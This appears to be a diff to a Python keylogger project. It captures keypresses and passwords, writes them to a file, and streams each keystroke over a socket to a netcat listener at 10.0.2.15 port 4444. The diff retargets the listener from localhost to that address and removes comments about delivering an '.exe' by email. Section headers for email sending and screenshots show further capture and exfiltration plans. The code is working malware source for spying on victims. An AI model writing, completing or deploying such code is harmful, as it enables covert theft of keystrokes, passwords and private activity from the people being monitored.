@@ -17,10 +17,6 @@ while True:
         data_file.write(password[0])
 
 
-# .exe file to execure
-# mail it with picture
-# ...
-
 # ===================================================== Filtering data =======================================================
 
 import json
@@ -58,12 +54,15 @@ print(f"Filtered results saved to {output_file_path}")
 # ===================================================== Sending by email =========================================================
 
 
+# ===================================================== Taking screenshots =======================================================
+
+
 # ===================================================== Typing live ==============================================================
 
 import socket
 
 # Netcat server details
-nc_host = "127.0.0.1"  # Replace with your netcat listener IP
+nc_host = "10.0.2.15"  # Replace with your netcat listener IP
 nc_port = 4444  # Replace with your netcat listener port
 
 
@@ -72,15 +71,19 @@ def send_key_to_netcat(key):
         # It opens a network socket using socket.socket() to communicate with the Netcat server and tries to connect using the server information
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((nc_host, nc_port))
+
             # If the key has a printable character (key.char exists), it is encoded and sent to the server (normal keys)
             if hasattr(key, "char") and key.char:
                 s.sendall(key.char.encode())
+
             # If the key is a space (keyboard.Key.space), a space character is sent (space)
             elif key == keyboard.Key.space:
                 s.sendall(b" ")
+
             # If the key is a special key (e.g., Shift, Ctrl), its name (e.g., [Key.shift]) is sent. (special keys)
             else:
                 s.sendall(f" [{key}] ".encode())
+
     # If there’s any issue (e.g., the server is unreachable), it prints an error message.
     except Exception as e:
         print(f"Error: {e}")
@@ -96,6 +99,3 @@ print("Keylogger is running... Press Ctrl+C to stop.")
 # Start the listener
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-
-
-# ===================================================== Taking screenshots =======================================================
